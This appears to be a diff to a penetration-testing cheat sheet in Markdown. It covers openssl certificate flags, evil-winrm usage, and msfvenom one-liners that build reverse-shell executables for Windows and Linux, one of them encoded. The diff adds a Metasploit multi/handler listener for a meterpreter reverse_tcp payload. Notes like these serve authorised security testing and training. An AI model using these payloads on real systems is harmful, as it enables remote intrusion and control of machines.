@@ -214,7 +214,7 @@ req indicates that this is a certificate signing request.
 -days 365 shows that the validity of our certificate will be one year
 -subj sets data, such as organization and country, via the command-line.
 -nodes simplifies our command and does not encrypt the private key
--keyout `PRIVATE_KEY` specifies the filename where we want to save our private key
+-keyout `PRIVATE\_KEY` specifies the filename where we want to save our private key
 -out CERTIFICATE specifies the filename to which we want to write the certificate request
 
 Merge the two files:
@@ -305,7 +305,7 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
     -l, --log                        Log the WinRM session
     -h, --help                       Display this help message
 ```
-## MSFvenom
+## MSFvenom and Metasploit
 Nice links:
 [The great g0tmi1k's payload creator](https://github.com/g0tmi1k/msfpc)
 [Common One Liners by Frizb](https://github.com/frizb/MSF-Venom-Cheatsheet)
@@ -326,4 +326,13 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 msfvemon -p linux/x86/shell/reverse_tcp -f elf -o shell.elf LHOST=<listen-IP> LPORT=<listen-port>
 #Example of -a and --encoder
 msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o shell.exe
+```
+
+Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
+```msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST $LISTENING-IP
+set LPORT $LISTENING-PORT
+exploit
 ```
